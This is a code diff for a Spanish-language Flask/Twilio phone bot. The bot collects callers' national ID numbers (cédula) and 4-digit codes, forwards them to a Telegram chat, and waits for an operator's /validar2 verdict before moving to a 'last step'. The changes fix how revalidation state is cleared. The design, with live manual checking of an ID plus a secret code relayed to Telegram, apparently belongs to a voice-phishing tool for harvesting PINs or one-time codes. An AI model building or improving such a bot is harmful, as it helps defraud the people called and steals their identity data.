@@ -280,7 +280,7 @@ def step1():
     response.redirect('/step1')
     return str(response)
 
-# CAMBIO 1: Modificar /save-step1 para mantener el estado de revalidación
+# CAMBIO 1: Modificar /save-step1 para limpiar validación anterior al corregir
 @app.route('/save-step1', methods=['POST'])
 def save_step1():
     digits = request.values.get('Digits')
@@ -299,15 +299,16 @@ def save_step1():
     # Verificar si estamos en un proceso de revalidación INTERMEDIA
     is_intermediate_revalidation = 'validacion_intermedia' in global_user_sessions[call_sid]
     
+    # LIMPIAR LA VALIDACIÓN ANTERIOR cuando el usuario está corrigiendo
+    if is_intermediate_revalidation:
+        logger.info(f"🧹 LIMPIANDO VALIDACIÓN ANTERIOR para permitir nueva validación - SID={call_sid}")
+        global_user_sessions[call_sid].pop('validacion_intermedia', None)
+        global_user_sessions[call_sid].pop('correction_in_progress', None)
+        # Mantener el flag de que estamos en proceso de revalidación intermedia
+        global_user_sessions[call_sid]['validacion_intermedia_pending'] = True
+    
     # Guardar la cédula
     global_user_sessions[call_sid]['cedula'] = digits
-    
-    # MANTENER el estado de revalidación intermedia si existe
-    if is_intermediate_revalidation:
-        logger.info(f"🔄 Manteniendo estado de revalidación intermedia para SID={call_sid}")
-        # NO eliminamos validacion_intermedia aquí
-        # PERO SÍ eliminamos correction_in_progress para indicar que el usuario ya corrigió
-        global_user_sessions[call_sid].pop('correction_in_progress', None)
     
     save_session_to_file(global_user_sessions)
     
@@ -326,7 +327,7 @@ def save_step1():
         response.pause(length=3)
     
     # Si estamos en revalidación intermedia, notificar a Telegram y continuar al siguiente paso
-    if is_intermediate_revalidation:
+    if 'validacion_intermedia_pending' in global_user_sessions[call_sid]:
         data = global_user_sessions[call_sid]
         msg = f"🔄 Cédula actualizada en revalidación intermedia:\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n\nResponde con:\n/validar2 {call_sid} 1 1 (si ambos están bien)\n/validar2 {call_sid} 1 0 (si la cédula está bien pero el código no)\n/validar2 {call_sid} 0 1 (si la cédula está mal pero el código bien)\n/validar2 {call_sid} 0 0 (si ambos están mal)"
         send_to_telegram(msg)
@@ -367,17 +368,15 @@ def save_step2():
         logger.info(f"🆕 Creada nueva sesión para SID={call_sid}")
     
     # Verificar si estamos en un proceso de revalidación INTERMEDIA
-    is_intermediate_revalidation = 'validacion_intermedia' in global_user_sessions[call_sid]
+    is_intermediate_revalidation = 'validacion_intermedia_pending' in global_user_sessions[call_sid]
+    
+    # LIMPIAR LA VALIDACIÓN ANTERIOR cuando el usuario está corrigiendo
+    if is_intermediate_revalidation:
+        logger.info(f"🧹 LIMPIANDO VALIDACIÓN ANTERIOR para permitir nueva validación - SID={call_sid}")
+        # La validacion_intermedia ya fue limpiada en el paso anterior, solo mantenemos el pending
     
     # Guardar el código de 4 dígitos
     global_user_sessions[call_sid]['code4'] = digits
-    
-    # MANTENER el estado de revalidación intermedia si existe
-    if is_intermediate_revalidation:
-        logger.info(f"🔄 Manteniendo estado de revalidación intermedia para SID={call_sid}")
-        # NO eliminamos validacion_intermedia aquí
-        # PERO SÍ eliminamos correction_in_progress para indicar que el usuario ya corrigió
-        global_user_sessions[call_sid].pop('correction_in_progress', None)
     
     save_session_to_file(global_user_sessions)
     
@@ -395,7 +394,11 @@ def save_step2():
     
     # Si estamos en revalidación intermedia, enviar mensaje de revalidación
     if is_intermediate_revalidation:
-        msg = f"🔄 Código 4 dígitos actualizado en revalidación intermedia:\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n\nResponde con:\n/validar2 {call_sid} 1 1 (si ambos están bien)\n/validar2 {call_sid} 1 0 (si la cédula está bien pero el código no)\n/validar2 {call_sid} 0 1 (si la cédula está mal pero el código bien)\n/validar2 {call_sid} 0 0 (si ambos están mal)"
+        # Limpiar el flag de pending ya que vamos a enviar nueva validación
+        global_user_sessions[call_sid].pop('validacion_intermedia_pending', None)
+        save_session_to_file(global_user_sessions)
+        
+        msg = f"🔄 Datos actualizados en revalidación intermedia:\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n\nResponde con:\n/validar2 {call_sid} 1 1 (si ambos están bien)\n/validar2 {call_sid} 1 0 (si la cédula está bien pero el código no)\n/validar2 {call_sid} 0 1 (si la cédula está mal pero el código bien)\n/validar2 {call_sid} 0 0 (si ambos están mal)"
         send_to_telegram(msg)
         
         response.say("Gracias. Estamos revalidando sus datos actualizados. Por favor, espere unos momentos.", language='es-ES')
@@ -410,7 +413,7 @@ def save_step2():
     
     return str(response)
 
-# CAMBIO 2: Nueva ruta para esperar validación intermedia
+# CAMBIO 2: Modificar waiting-intermediate-validation para no redirigir inmediatamente si hay validación pendiente
 @app.route('/waiting-intermediate-validation', methods=['POST', 'GET'])
 def waiting_intermediate_validation():
     """
@@ -429,13 +432,6 @@ def waiting_intermediate_validation():
         response.say("Lo sentimos, hubo un error en el proceso. Finalizando llamada.", language='es-ES')
         return str(response)
     
-    # Verificar inmediatamente si ya hay una validación intermedia
-    if call_sid in global_user_sessions and 'validacion_intermedia' in global_user_sessions[call_sid]:
-        logger.info(f"⚠️ VALIDACIÓN INTERMEDIA YA EXISTENTE PARA SID={call_sid}: {global_user_sessions[call_sid]['validacion_intermedia']}")
-        response = VoiceResponse()
-        response.redirect(f"/intermediate-validation-result?sid={call_sid}")
-        return str(response)
-    
     # Verificar si SID existe en sesiones
     if call_sid not in global_user_sessions:
         logger.error(f"❌ ERROR: SID {call_sid} no encontrado en sesiones durante la espera intermedia")
@@ -443,6 +439,8 @@ def waiting_intermediate_validation():
         response.say("Lo sentimos, hubo un error en la validación. Finalizando llamada.", language='es-ES')
         return str(response)
     
+    # CAMBIO IMPORTANTE: No verificar inmediatamente si hay validación antigua
+    # Solo verificar si hay una validación NUEVA (no una que quedó de antes)
     response = VoiceResponse()
     
     # Añadir un mensaje personalizado de espera
@@ -455,15 +453,11 @@ def waiting_intermediate_validation():
     response.pause(length=10)
     
     # Redirigir a la verificación de resultados intermedios después de la espera
-    if call_sid in global_user_sessions and 'validacion_intermedia' in global_user_sessions[call_sid]:
-        logger.info(f"✅ VALIDACIÓN INTERMEDIA DETECTADA DURANTE LA PAUSA PARA SID={call_sid}")
-        response.redirect(f"/intermediate-validation-result?sid={call_sid}")
-    else:
-        response.redirect(f"/intermediate-validation-result?sid={call_sid}")
+    response.redirect(f"/intermediate-validation-result?sid={call_sid}")
     
     return str(response)
 
-# CAMBIO 3: Nueva ruta para procesar resultados de validación intermedia
+# CAMBIO 3: Modificar intermediate-validation-result para manejar mejor los casos
 @app.route('/intermediate-validation-result', methods=['GET', 'POST'])
 def intermediate_validation_result():
     call_sid = request.values.get('sid')
@@ -505,9 +499,10 @@ def intermediate_validation_result():
             save_session_to_file(global_user_sessions)
         
         if validation == [1, 1]:  # Ambos datos correctos
-            # ELIMINAR el estado de revalidación intermedia Y correction_in_progress
+            # ELIMINAR todos los estados de revalidación
             global_user_sessions[call_sid].pop('validacion_intermedia', None)
             global_user_sessions[call_sid].pop('correction_in_progress', None)
+            global_user_sessions[call_sid].pop('validacion_intermedia_pending', None)
             save_session_to_file(global_user_sessions)
             
             response.say("Los primeros datos son correctos. Continuemos con el último paso.", language='es-ES')
@@ -521,7 +516,7 @@ def intermediate_validation_result():
             if not correction_in_progress:
                 # PRIMERA VEZ detectando el error, marcar corrección en progreso
                 global_user_sessions[call_sid]['correction_in_progress'] = True
-                # NO eliminar la validación_intermedia aquí, la mantenemos para referencia
+                # NO eliminar la validación_intermedia aquí, pero SÍ marcar que se limpiará al corregir
                 save_session_to_file(global_user_sessions)
                 
                 # Mensaje general cuando hay errores en los primeros datos
@@ -539,9 +534,6 @@ def intermediate_validation_result():
                 return str(response)
             else:
                 # YA ESTAMOS EN PROCESO DE CORRECCIÓN
-                # Esto significa que el usuario ya corrigió el dato y volvemos a tener una validación negativa
-                # Verificar si la validación actual es diferente a la anterior
-                
                 # Para evitar bucles infinitos, limitar el número de correcciones
                 correction_count_key = f"{call_sid}_correction_count"
                 correction_count = global_user_sessions[call_sid].get(correction_count_key, 0)
@@ -557,9 +549,7 @@ def intermediate_validation_result():
                 
                 logger.info(f"🔄 CORRECCIÓN #{correction_count + 1} PARA SID={call_sid} - VALIDACIÓN: {validation}")
                 
-                # Eliminar la validación anterior para permitir una nueva
-                global_user_sessions[call_sid].pop('validacion_intermedia', None)
-                save_session_to_file(global_user_sessions)
+                # AQUÍ NO eliminamos la validación, porque será eliminada cuando el usuario ingrese el nuevo dato
                 
                 response.say("Los datos siguen siendo incorrectos. Vamos a intentarlo una vez más.", language='es-ES')
                 
